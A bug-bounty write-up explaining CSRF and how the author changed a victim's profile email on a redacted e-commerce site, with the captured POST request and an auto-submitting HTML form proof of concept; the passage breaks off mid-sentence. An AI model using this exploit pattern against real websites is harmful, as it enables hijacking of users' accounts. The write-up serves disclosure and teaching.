---
title: How I Was Able to Takeover User Accounts via CSRF on an E-Commerce Website
url: https://infosecwriteups.com/how-i-was-able-to-takeover-user-accounts-via-csrf-on-an-e-commerce-website-1e2dcf740c3d?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2023-02-11
fetch_date: 2025-10-04T06:19:57.394347
---

# How I Was Able to Takeover User Accounts via CSRF on an E-Commerce Website

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F1e2dcf740c3d&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fhow-i-was-able-to-takeover-user-accounts-via-csrf-on-an-e-commerce-website-1e2dcf740c3d&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fhow-i-was-able-to-takeover-user-accounts-via-csrf-on-an-e-commerce-website-1e2dcf740c3d&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-1e2dcf740c3d---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-1e2dcf740c3d---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# How I Was Able to Takeover User Accounts via CSRF on an E-Commerce Website

[![Crisdeo Nuel Siahaan](https://miro.medium.com/v2/da:true/resize:fill:64:64/0*Bf1zm5UZxOiKCWwf)](https://medium.com/%40k_kisanak?source=post_page---byline--1e2dcf740c3d---------------------------------------)

[Crisdeo Nuel Siahaan](https://medium.com/%40k_kisanak?source=post_page---byline--1e2dcf740c3d---------------------------------------)

5 min read

·

Feb 5, 2023

--

2

Listen

Share

Press enter or click to view image in full size

![]()

Hi Folks!

In this article, We’ll talk about the topic of cross-site request forgery (CSRF) vulnerabilities and I’ll share my personal experience of successfully executing a one-click account takeover on an e-commerce website. This serves as a reminder of the critical role that proper security measures play in keeping our sensitive information safe.

## **So… What’s this CSRF thing?**

Cross-Site Request Forgery (CSRF) is a type of security vulnerability that affects web applications. It happens when a malicious website is able to trick a user’s browser into sending a request to another website, without the user’s knowledge or consent. This can be used to perform unauthorized actions, such as modifying the user’s profile, posting unwanted content, or making unauthorized purchases.

**How it works?**

Imagine that a user, let’s call him **victim A**, has logged into his account on an online bank website that is vulnerable to CSRF. Then he send a request to transfer money to his nephew, Little Timmy. The normal request would look something like this:

Press enter or click to view image in full size

![]()

normal request

After that, let’s say **victim A** visits a malicious website created by **attacker B**. Since the online bank website has a CSRF vulnerability, the malicious website could send a forged prefilled request to the bank website to transfer money to **attacker B**, without **victim A** even noticing. This is possible because **victim A**’s browser automatically sends a valid session token with each request, which allows the **attacker B** to take actions on behalf of the **victim A**.

Press enter or click to view image in full size

![]()

CSRF request

**How to protect?**

To protect against CSRF attacks, websites need to implement proper security measures. One common method is to include a unique token, known as a CSRF token, with each form submission. This token is checked on the server to make sure that the request came from the same website that it was intended for. This way, even if a malicious website sends a request, the server will know it’s not legitimate and reject it.

Press enter or click to view image in full size

![]()

CSRF protection

In summary, CSRF is a serious security vulnerability that can have devastating consequences for both users and websites. It’s important for web developers to be aware of this threat and take the necessary steps to protect their users.

## **The Bug**

The target is an E-commerce website from United States. Like most E-Commerce websites, this website provided a feature edit profile on customer’s account. I can’t disclose the name of the website, so let’s call it as redacted.com :)

First, I created a dummy victim account and filled in the details.

Press enter or click to view image in full size

![]()

victimemail@gmail.com

During my testing of updating a user profile using Burp Suite, I noticed that the server uses a POST request to send the updated information and there is no protection against CSRF in place. The profile update request appears as follows:

```
POST /secure/profile/profile_form_handler.php HTTP/2
Host: redacted.com
Cookie: <user_cookies_goes_here>
User-Agent: Mozilla/5.0 (Windows VT 10.0; Win64; x64, rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: grip, deflate
Content-Type: application/x-www-form-urlencoded, charset=UTF-8
X-Requested-With: XMLMttpRequest
Content-Length: 231
Origin: redacted.com
Referer: https://redacted.com/secure/profile/profile
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

nextpage=%2Fsecure%2Fprofile%2Fupdated_profile&prevpage=%2Fsecure%2Fprofile%2Fprofile&fromea=&selectedRadialValue=790&txtEmail=victimemail%40gmail.com& txtFirstName=victim&txtLastName=victim&txtDayPhone=12345678&hdnSmsPhone=12345678
```

Now, I copied this CSRF POC from <https://hackerone.com/reports/834366> , modify the data, and saved it as an html page. Here’s my POC:

```
<!DOCTYPE html>
<html>
  <body>
    <form action="https://redacted.com/secure/profile/profile_form_handler.php" method="POST">
        <input type="hidden" name="nextpage" value="%2Fsecure%2Fprofile%2Fupdated_profile"/>
        <input type="hidden" name="prevpage" value="%2Fsecure%2Fprofile%2Fprofile"/>
        <input type="hidden" name="selectedRadialValue" value="790"/>
        <input type="hidden" name="txtEmail" value="lybybyte@mailo.icu"/>
        <input type="hidden" name="txtFirstName" value="hacked"/>
        <input type="hidden" name="txtLastName" value="hacked"/>
        <input type="hidden" name="txtDayPhone" value="999999999"/>
        <input type="hidden" name="hdnSmsPhone" value="999999999"/>
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Then I opened the POC in a victim’s browser, and it displayed a “success” response. Upon re-visiting the redacted.com profile page, I observed that the attacker had successfully updated the victim’s profile.

Press enter or click to view image in full size

![]()

Response Success

Press enter or click to view image in full size

![]()

Just one click from the victim and the victim profile is entirely updated

Jackpot! Just one click from the victim and the victim profile is entirely updated. At this point, the integrity aspect of the use...